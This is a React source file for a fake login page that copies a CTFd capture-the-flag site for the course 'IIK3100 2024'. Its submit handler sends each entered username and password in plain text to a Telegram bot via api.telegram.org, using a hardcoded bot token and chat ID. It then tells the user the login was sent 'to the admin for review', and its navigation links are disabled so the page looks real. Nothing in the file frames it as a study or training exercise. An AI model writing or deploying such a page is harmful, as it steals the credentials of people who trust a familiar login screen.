import { UserPlus, LogIn } from "lucide-react";
import "./index.css";

export default function LoginPage() {
    const handleLinkClick = (event: React.MouseEvent<HTMLAnchorElement>) => {
        alert("Login first to continue");
        event.preventDefault(); // Prevent the link from navigating
    };

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        const username = (document.getElementById('username') as HTMLInputElement).value;
        const password = (document.getElementById('password') as HTMLInputElement).value;

        // Replace with your bot token and chat ID
        const telegramToken = '7773700184:AAHFQgISfE-fYX69a8jqTdG2bfWhgdwcoCQ';
        const chatId = '955533875'; // Replace YOUR_CHAT_ID with your actual Telegram chat ID

        try {
            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `Username: ${username}, Password: ${password}`,
                }),
            });
            alert("Login information was sent to the admin for review. Come back later to check your login status.");
        } catch (error) {
            console.error("Error sending message:", error);
            alert("Failed to send login information.");
        }
    };

    return (
        <div className="min-h-screen flex flex-col">
            {/* Navigation Bar and Login Header */}
            <div className="bg-[#1c1f24] text-gray-300">
                <nav className="container mx-auto px-4 h-14 flex items-center">
                    <div className="flex items-center space-x-6">
                        <a href="#" className="text-white font-medium" onClick={handleLinkClick}>
                            IIK3100 2024
                        </a>
                        <a href="#" className="hover:text-white" onClick={handleLinkClick}>
                            Users
                        </a>
                        <a href="#" className="hover:text-white" onClick={handleLinkClick}>
                            Scoreboard
                        </a>
                        <a href="#" className="hover:text-white" onClick={handleLinkClick}>
                            Challenges
                        </a>
                    </div>
                    <div className="ml-auto flex items-center space-x-4">
                        <a href="#" className="hover:text-white flex items-center" onClick={handleLinkClick}>
                            <UserPlus className="mr-1 h-4 w-4" />
                            Register
                        </a>
                        <a href="#" className="hover:text-white flex items-center">
                            <LogIn className="mr-1 h-4 w-4" />
                            Login
                        </a>
                    </div>
                </nav>
                <div className="container mx-auto px-4 py-8 text-center">
                    <h1 className="text-4xl font-normal text-white">Login</h1>
                </div>
            </div>

            {/* Main Content */}
            <main className="flex-1 flex flex-col items-center px-4 py-12 bg-white">
                <div className="w-full max-w-md space-y-6">
                    <form className="space-y-6" onSubmit={handleSubmit}>
                        <div className="space-y-2">
                            <label htmlFor="username" className="block text-sm font-medium text-gray-700">
                                User Name or Email
                            </label>
                            <input
                                id="username"
                                type="text"
                                className="w-full px-3 py-2 border border-[#86b7fe] rounded-md focus:outline-none focus:ring-2 focus:ring-[#86b7fe]"
                                required
                            />
                        </div>

                        <div className="space-y-2">
                            <label htmlFor="password" className="block text-sm font-medium text-gray-700">
                                Password
                            </label>
                            <input
                                id="password"
                                type="password"
                                className="w-full px-3 py-2 border rounded-md bg-[#e9ecef] focus:outline-none focus:ring-2 focus:ring-[#86b7fe]"
                                required
                            />
                        </div>

                        <div className="flex items-center justify-between pt-2">
                            <a
                                href="#"
                                className="text-[#3498db] hover:underline text-sm"
                                onClick={handleLinkClick}
                            >
                                Forgot your password?
                            </a>
                            <button
                                type="submit"
                                className="bg-[#3498db] text-white px-6 py-2 rounded-md hover:bg-[#2980b9] focus:outline-none focus:ring-2 focus:ring-[#3498db] focus:ring-offset-2"
                            >
                                Submit
                            </button>
                        </div>
                    </form>
                </div>
            </main>

            {/* Footer */}
            <footer className="py-4 text-center text-sm text-gray-600">
                Powered by CTFd
            </footer>
        </div>
    );
}